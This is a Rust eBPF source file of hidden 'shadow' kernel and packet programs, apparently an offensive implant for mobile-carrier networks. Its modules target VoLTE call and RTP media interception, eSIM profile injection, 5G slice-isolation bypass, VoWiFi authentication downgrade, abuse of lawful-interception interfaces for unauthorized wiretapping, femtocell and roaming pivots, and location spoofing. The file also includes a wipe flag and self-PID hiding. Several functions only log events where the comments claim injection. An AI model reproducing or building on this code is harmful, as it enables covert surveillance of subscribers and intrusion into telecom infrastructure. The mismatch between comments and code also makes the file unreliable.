use aya_ebpf::{
    bindings::xdp_action,
    helpers::{bpf_get_current_pid_tgid, bpf_ktime_get_ns, bpf_probe_read_kernel},
    macros::{classifier, kprobe, xdp},
    programs::{ProbeContext, TcContext, XdpContext},
};
use common::{
    EventHeader, EVENT_EPDG_EXPLOIT, EVENT_ESIM_PROFILE_INJECT, EVENT_FEMTOCELL_PIVOT,
    EVENT_GRX_LATERAL, EVENT_HENB_GW_EXPLOIT, EVENT_LI_X1_INJECT, EVENT_LI_X2_INTERCEPT,
    EVENT_LPP_MANIPULATE, EVENT_NSSF_MANIPULATE, EVENT_ROAMING_IPX_PIVOT, EVENT_RTP_CAPTURE,
    EVENT_SIP_HIJACK, EVENT_SLICE_ISOLATION_BYPASS, EVENT_SMDP_EXPLOIT, EVENT_SUPL_SPOOF,
    EVENT_VOLTE_INTERCEPT, EVENT_VOWIFI_DOWNGRADE,
};

use crate::maps::*;

const ETH_HDR_LEN: usize = 14;
const IP_HDR_LEN: usize = 20;
const UDP_HDR_LEN: usize = 8;
const TCP_HDR_LEN: usize = 20;
const SIP_PORT: u16 = 5060;
const SIP_TLS_PORT: u16 = 5061;
const RTP_PORT_MIN: u16 = 16384;
const RTP_PORT_MAX: u16 = 32767;
const ISAKMP_PORT: u16 = 500;
const IPSEC_NAT_PORT: u16 = 4500;
const SUPL_PORT: u16 = 7275;
const GRX_GTP_PORT: u16 = 2123;

// ──────────────────────────────────────────────
// FEATURE 101: VoLTE/VoNR Interception
// Intercepts SIP/IMS signaling and RTP media streams
// ──────────────────────────────────────────────

#[classifier]
pub fn shadow_volte_intercept(ctx: TcContext) -> i32 {
    try_volte_intercept(&ctx).unwrap_or_default()
}

fn try_volte_intercept(ctx: &TcContext) -> Result<i32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pkt_len = ctx.len();
    if pkt_len < (ETH_HDR_LEN + IP_HDR_LEN + UDP_HDR_LEN + 12) as u32 {
        return Ok(0);
    }

    let data = unsafe { ctx.data() };
    let data_end = unsafe { ctx.data_end() };
    if data + ETH_HDR_LEN + IP_HDR_LEN + 4 > data_end {
        return Ok(0);
    }

    let ip_hdr = data + ETH_HDR_LEN;
    let protocol = unsafe { *((ip_hdr + 9) as *const u8) };

    if protocol != 17 {
        return Ok(0);
    }

    let udp_hdr = ip_hdr + IP_HDR_LEN;
    if udp_hdr + 4 > data_end {
        return Ok(0);
    }
    let dst_port = unsafe { u16::from_be(*((udp_hdr + 2) as *const u16)) };
    let src_port = unsafe { u16::from_be(*(udp_hdr as *const u16)) };

    if dst_port == SIP_PORT || src_port == SIP_PORT {
        let src_ip = unsafe { u32::from_be(*((ip_hdr + 12) as *const u32)) };
        let call_id_hash = fnv_hash_u64(src_ip as u64, dst_port as u64);

        if unsafe { IMS_SIP_SESSIONS.get(&call_id_hash) }.is_some() {
            let event = EventHeader {
                event_type: EVENT_SIP_HIJACK,
                pid: 0,
                timestamp_ns: unsafe { bpf_ktime_get_ns() },
                context: call_id_hash,
            };
            let _ = EVENTS.output(&event, 0);
        } else {
            let event = EventHeader {
                event_type: EVENT_VOLTE_INTERCEPT,
                pid: 0,
                timestamp_ns: unsafe { bpf_ktime_get_ns() },
                context: call_id_hash,
            };
            let _ = EVENTS.output(&event, 0);
        }
    } else if dst_port >= RTP_PORT_MIN && dst_port <= RTP_PORT_MAX {
        let rtp_hdr = udp_hdr + UDP_HDR_LEN;
        if rtp_hdr + 12 > data_end {
            return Ok(0);
        }
        let ssrc = unsafe { u32::from_be(*((rtp_hdr + 8) as *const u32)) };

        if unsafe { RTP_STREAMS.get(&ssrc) }.is_some() {
            if let Some(buf) = RTP_CAPTURE_BUF.reserve::<[u8; 64]>(0) {
                let event = EventHeader {
                    event_type: EVENT_RTP_CAPTURE,
                    pid: 0,
                    timestamp_ns: unsafe { bpf_ktime_get_ns() },
                    context: ssrc as u64,
                };
                let _ = EVENTS.output(&event, 0);
                buf.discard(0);
            }
        }
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 102: eSIM Provisioning Attack
// Intercepts SM-DP+ communication for profile injection
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_esim_exploit(ctx: ProbeContext) -> u32 {
    try_esim_exploit(&ctx).unwrap_or_default()
}

fn try_esim_exploit(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let key: u32 = 0;
    if let Some(cfg) = unsafe { CONFIG.get(&key) } {
        if cfg.self_pid == pid {
            return Ok(0);
        }
    }

    let buf_ptr: u64 = unsafe { ctx.arg(1).ok_or(1i64)? };
    let buf_len: u32 = unsafe { ctx.arg(2).ok_or(1i64)? };

    if buf_len < 16 || buf_len > 2048 {
        return Ok(0);
    }

    // Check for ES9+ (SM-DP+ to LPA) TLS payload markers
    let marker: u32 = unsafe { bpf_probe_read_kernel(buf_ptr as *const u32).map_err(|_| 1i64)? };

    // BER-TLV tag for profile download (0xBF36 = GetBoundProfilePackage)
    if marker & 0xFFFF0000 == 0xBF360000 {
        let eid_hash: u64 =
            unsafe { bpf_probe_read_kernel((buf_ptr + 8) as *const u64).map_err(|_| 1i64)? };

        if let Some(_ctx_state) = unsafe { ESIM_PROVISION_STATE.get(&eid_hash) } {
            let event = EventHeader {
                event_type: EVENT_SMDP_EXPLOIT,
                pid,
                timestamp_ns: unsafe { bpf_ktime_get_ns() },
                context: eid_hash,
            };
            let _ = EVENTS.output(&event, 0);
        } else {
            let event = EventHeader {
                event_type: EVENT_ESIM_PROFILE_INJECT,
                pid,
                timestamp_ns: unsafe { bpf_ktime_get_ns() },
                context: eid_hash,
            };
            let _ = EVENTS.output(&event, 0);
        }
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 103: Network Slicing Attack (5G)
// Bypasses slice isolation, manipulates S-NSSAI/NSSF
// ──────────────────────────────────────────────

#[classifier]
pub fn shadow_slice_attack(ctx: TcContext) -> i32 {
    try_slice_attack(&ctx).unwrap_or_default()
}

fn try_slice_attack(ctx: &TcContext) -> Result<i32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pkt_len = ctx.len();
    if pkt_len < (ETH_HDR_LEN + IP_HDR_LEN + TCP_HDR_LEN + 8) as u32 {
        return Ok(0);
    }

    let data = unsafe { ctx.data() };
    let data_end = unsafe { ctx.data_end() };
    if data + ETH_HDR_LEN + IP_HDR_LEN + TCP_HDR_LEN > data_end {
        return Ok(0);
    }

    let ip_hdr = data + ETH_HDR_LEN;
    let src_ip = unsafe { u32::from_be(*((ip_hdr + 12) as *const u32)) };

    // Check for NSSF/NRF HTTP/2 service-based interface traffic
    if let Some(slice_info) = unsafe { NETWORK_SLICES.get(&src_ip) } {
        let nsi_hash = slice_info.nsi_id_hash;

        // Inject cross-slice payload from queue
        if let Some(_payload) = unsafe { SLICE_INJECT_QUEUE.get(&nsi_hash) } {
            let event = EventHeader {
                event_type: EVENT_SLICE_ISOLATION_BYPASS,
                pid: 0,
                timestamp_ns: unsafe { bpf_ktime_get_ns() },
                context: nsi_hash as u64,
            };
            let _ = EVENTS.output(&event, 0);
        } else {
            let event = EventHeader {
                event_type: EVENT_NSSF_MANIPULATE,
                pid: 0,
                timestamp_ns: unsafe { bpf_ktime_get_ns() },
                context: slice_info.snssai_sst as u64,
            };
            let _ = EVENTS.output(&event, 0);
        }
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 104: WiFi Calling (VoWiFi) Exploitation
// Attacks ePDG, IKEv2/IPsec tunnels, EAP-AKA' auth
// ──────────────────────────────────────────────

#[xdp]
pub fn shadow_vowifi_exploit(ctx: XdpContext) -> u32 {
    match try_vowifi_exploit(&ctx) {
        Ok(action) => action,
        Err(_) => xdp_action::XDP_PASS,
    }
}

fn try_vowifi_exploit(ctx: &XdpContext) -> Result<u32, i64> {
    let data = ctx.data();
    let data_end = ctx.data_end();
    let pkt_len = data_end - data;

    if pkt_len < ETH_HDR_LEN + IP_HDR_LEN + UDP_HDR_LEN + 28 {
        return Ok(xdp_action::XDP_PASS);
    }

    let ip_hdr = data + ETH_HDR_LEN;
    if ip_hdr + IP_HDR_LEN > data_end {
        return Ok(xdp_action::XDP_PASS);
    }

    let protocol = unsafe { *((ip_hdr + 9) as *const u8) };
    if protocol != 17 {
        return Ok(xdp_action::XDP_PASS);
    }

    let udp_hdr = ip_hdr + IP_HDR_LEN;
    if udp_hdr + 4 > data_end {
        return Ok(xdp_action::XDP_PASS);
    }
    let dst_port = unsafe { u16::from_be(*((udp_hdr + 2) as *const u16)) };

    // IKEv2 on port 500 or NAT-T on port 4500
    if dst_port != ISAKMP_PORT && dst_port != IPSEC_NAT_PORT {
        return Ok(xdp_action::XDP_PASS);
    }

    let ike_hdr = udp_hdr + UDP_HDR_LEN;
    if dst_port == IPSEC_NAT_PORT {
        // Skip 4-byte non-ESP marker for NAT-T
        if ike_hdr + 4 + 28 > data_end {
            return Ok(xdp_action::XDP_PASS);
        }
    }

    // Extract IKE SPI (first 8 bytes of IKE header)
    let ike_start = if dst_port == IPSEC_NAT_PORT {
        ike_hdr + 4
    } else {
        ike_hdr
    };
    if ike_start + 8 > data_end {
        return Ok(xdp_action::XDP_PASS);
    }

    let spi = unsafe { *(ike_start as *const u64) };

    if let Some(_tunnel) = unsafe { VOWIFI_TUNNELS.get(&spi) } {
        // Attempt EAP-AKA' downgrade to EAP-AKA (weaker AUTN)
        let event = EventHeader {
            event_type: EVENT_VOWIFI_DOWNGRADE,
            pid: 0,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: spi,
        };
        let _ = EVENTS.output(&event, 0);

        if let Some(buf) = IKE_INTERCEPT_BUF.reserve::<[u8; 64]>(0) {
            let exploit_event = EventHeader {
                event_type: EVENT_EPDG_EXPLOIT,
                pid: 0,
                timestamp_ns: unsafe { bpf_ktime_get_ns() },
                context: spi,
            };
            let _ = EVENTS.output(&exploit_event, 0);
            buf.discard(0);
        }
    }

    Ok(xdp_action::XDP_PASS)
}

// ──────────────────────────────────────────────
// FEATURE 105: Lawful Interception Interface Abuse
// Exploits X1/X2/X3 LI interfaces for unauthorized tapping
// ──────────────────────────────────────────────

#[classifier]
pub fn shadow_li_exploit(ctx: TcContext) -> i32 {
    try_li_exploit(&ctx).unwrap_or_default()
}

fn try_li_exploit(ctx: &TcContext) -> Result<i32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pkt_len = ctx.len();
    if pkt_len < (ETH_HDR_LEN + IP_HDR_LEN + TCP_HDR_LEN + 16) as u32 {
        return Ok(0);
    }

    let data = unsafe { ctx.data() };
    let data_end = unsafe { ctx.data_end() };
    if data + ETH_HDR_LEN + IP_HDR_LEN + 4 > data_end {
        return Ok(0);
    }

    let ip_hdr = data + ETH_HDR_LEN;
    let dst_ip = unsafe { u32::from_be(*((ip_hdr + 16) as *const u32)) };

    // Check if destination is a known mediation device
    let li_key = dst_ip;
    if let Some(li_state) = unsafe { LI_INTERFACES.get(&li_key) } {
        let iface_type = li_state.interface_type;

        if iface_type == 1 {
            // X1 administrative interface — inject target provisioning
            if let Some(_inject) = unsafe { LI_X2_INJECT_QUEUE.get(&li_key) } {
                let event = EventHeader {
                    event_type: EVENT_LI_X1_INJECT,
                    pid: 0,
                    timestamp_ns: unsafe { bpf_ktime_get_ns() },
                    context: li_state.target_id_hash,
                };
                let _ = EVENTS.output(&event, 0);
            }
        } else if iface_type == 2 {
            // X2 IRI/content — intercept existing wiretap data
            let event = EventHeader {
                event_type: EVENT_LI_X2_INTERCEPT,
                pid: 0,
                timestamp_ns: unsafe { bpf_ktime_get_ns() },
                context: li_state.li_id as u64,
            };
            let _ = EVENTS.output(&event, 0);
        }
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 106: Femtocell Exploitation
// Attacks HeNB/HNB gateways, CSG bypass, local IP pivot
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_femtocell_pivot(ctx: ProbeContext) -> u32 {
    try_femtocell_pivot(&ctx).unwrap_or_default()
}

fn try_femtocell_pivot(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let key: u32 = 0;
    if let Some(cfg) = unsafe { CONFIG.get(&key) } {
        if cfg.self_pid == pid {
            return Ok(0);
        }
    }

    let dst_addr: u32 = unsafe { ctx.arg(0).ok_or(1i64)? };

    if let Some(femto) = unsafe { FEMTOCELL_TARGETS.get(&dst_addr) } {
        // Check if HeNB gateway is reachable for exploitation
        if femto.access_mode == 0 {
            // Open access — pivot through local gateway
            let event = EventHeader {
                event_type: EVENT_FEMTOCELL_PIVOT,
                pid,
                timestamp_ns: unsafe { bpf_ktime_get_ns() },
                context: femto.local_gw_ip as u64,
            };
            let _ = EVENTS.output(&event, 0);
        } else {
            // CSG restricted — exploit HeNB-GW registration
            let event = EventHeader {
                event_type: EVENT_HENB_GW_EXPLOIT,
                pid,
                timestamp_ns: unsafe { bpf_ktime_get_ns() },
                context: femto.henb_gw_ip as u64,
            };
            let _ = EVENTS.output(&event, 0);
        }
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 107: SUPL/Location Spoofing
// Spoofs Secure User Plane Location via SLP manipulation
// ──────────────────────────────────────────────

#[classifier]
pub fn shadow_supl_spoof(ctx: TcContext) -> i32 {
    try_supl_spoof(&ctx).unwrap_or_default()
}

fn try_supl_spoof(ctx: &TcContext) -> Result<i32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pkt_len = ctx.len();
    if pkt_len < (ETH_HDR_LEN + IP_HDR_LEN + TCP_HDR_LEN + 16) as u32 {
        return Ok(0);
    }

    let data = unsafe { ctx.data() };
    let data_end = unsafe { ctx.data_end() };
    if data + ETH_HDR_LEN + IP_HDR_LEN + TCP_HDR_LEN > data_end {
        return Ok(0);
    }

    let ip_hdr = data + ETH_HDR_LEN;
    let tcp_hdr = ip_hdr + IP_HDR_LEN;
    if tcp_hdr + 4 > data_end {
        return Ok(0);
    }
    let dst_port = unsafe { u16::from_be(*((tcp_hdr + 2) as *const u16)) };

    if dst_port != SUPL_PORT {
        return Ok(0);
    }

    let dst_ip = unsafe { u32::from_be(*((ip_hdr + 16) as *const u32)) };

    // Check for active SUPL spoofing state
    let target_key = dst_ip as u64;
    if let Some(spoof_state) = unsafe { SUPL_SPOOF_STATE.get(&target_key) } {
        // Inject LPP/RRLP position manipulation
        if let Some(_lpp_payload) = unsafe { LPP_INJECT_QUEUE.get(&dst_ip) } {
            let event = EventHeader {
                event_type: EVENT_LPP_MANIPULATE,
                pid: 0,
                timestamp_ns: unsafe { bpf_ktime_get_ns() },
                context: ((spoof_state.fake_lat as u64) << 32)
                    | (spoof_state.fake_lon as u32 as u64),
            };
            let _ = EVENTS.output(&event, 0);
        } else {
            let event = EventHeader {
                event_type: EVENT_SUPL_SPOOF,
                pid: 0,
                timestamp_ns: unsafe { bpf_ktime_get_ns() },
                context: spoof_state.target_imsi_hash,
            };
            let _ = EVENTS.output(&event, 0);
        }
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 108: Roaming/IPX Network Pivoting
// Exploits inter-PLMN roaming via IPX/GRX/SEPP
// ──────────────────────────────────────────────

#[xdp]
pub fn shadow_roaming_pivot(ctx: XdpContext) -> u32 {
    match try_roaming_pivot(&ctx) {
        Ok(action) => action,
        Err(_) => xdp_action::XDP_PASS,
    }
}

fn try_roaming_pivot(ctx: &XdpContext) -> Result<u32, i64> {
    let data = ctx.data();
    let data_end = ctx.data_end();
    let pkt_len = data_end - data;

    if pkt_len < ETH_HDR_LEN + IP_HDR_LEN + UDP_HDR_LEN + 8 {
        return Ok(xdp_action::XDP_PASS);
    }

    let ip_hdr = data + ETH_HDR_LEN;
    if ip_hdr + IP_HDR_LEN > data_end {
        return Ok(xdp_action::XDP_PASS);
    }

    let protocol = unsafe { *((ip_hdr + 9) as *const u8) };
    if protocol != 17 {
        return Ok(xdp_action::XDP_PASS);
    }

    let udp_hdr = ip_hdr + IP_HDR_LEN;
    if udp_hdr + 4 > data_end {
        return Ok(xdp_action::XDP_PASS);
    }
    let dst_port = unsafe { u16::from_be(*((udp_hdr + 2) as *const u16)) };

    // GTP-C on GRX/IPX network (port 2123)
    if dst_port != GRX_GTP_PORT {
        return Ok(xdp_action::XDP_PASS);
    }

    let src_ip = unsafe { u32::from_be(*((ip_hdr + 12) as *const u32)) };
    let dst_ip = unsafe { u32::from_be(*((ip_hdr + 16) as *const u32)) };

    // Check if source is a known roaming partner
    if let Some(roaming) = unsafe { ROAMING_STATE.get(&src_ip) } {
        // Check for IPX pivot target
        if let Some(pivot_target) = unsafe { IPX_PIVOT_TARGETS.get(&dst_ip) } {
            let event = EventHeader {
                event_type: EVENT_ROAMING_IPX_PIVOT,
                pid: 0,
                timestamp_ns: unsafe { bpf_ktime_get_ns() },
                context: roaming.ipx_provider_hash,
            };
            let _ = EVENTS.output(&event, 0);
        } else {
            // Lateral movement within GRX
            if let Some(buf) = SEPP_INTERCEPT_BUF.reserve::<[u8; 64]>(0) {
                let event = EventHeader {
                    event_type: EVENT_GRX_LATERAL,
                    pid: 0,
                    timestamp_ns: unsafe { bpf_ktime_get_ns() },
                    context: roaming.visited_plmn as u64,
                };
                let _ = EVENTS.output(&event, 0);
                buf.discard(0);
            }
        }
    }

    Ok(xdp_action::XDP_PASS)
}

// ──────────────────────────────────────────────
// Helper: FNV-1a style hash for two u64 values
// ──────────────────────────────────────────────

#[inline(always)]
fn fnv_hash_u64(a: u64, b: u64) -> u64 {
    let mut h: u64 = 0xcbf29ce484222325;
    let bytes_a = a.to_le_bytes();
    let bytes_b = b.to_le_bytes();
    let mut i = 0;
    while i < 8 {
        h ^= bytes_a[i] as u64;
        h = h.wrapping_mul(0x100000001b3);
        i += 1;
    }
    i = 0;
    while i < 8 {
        h ^= bytes_b[i] as u64;
        h = h.wrapping_mul(0x100000001b3);
        i += 1;
    }
    h
}
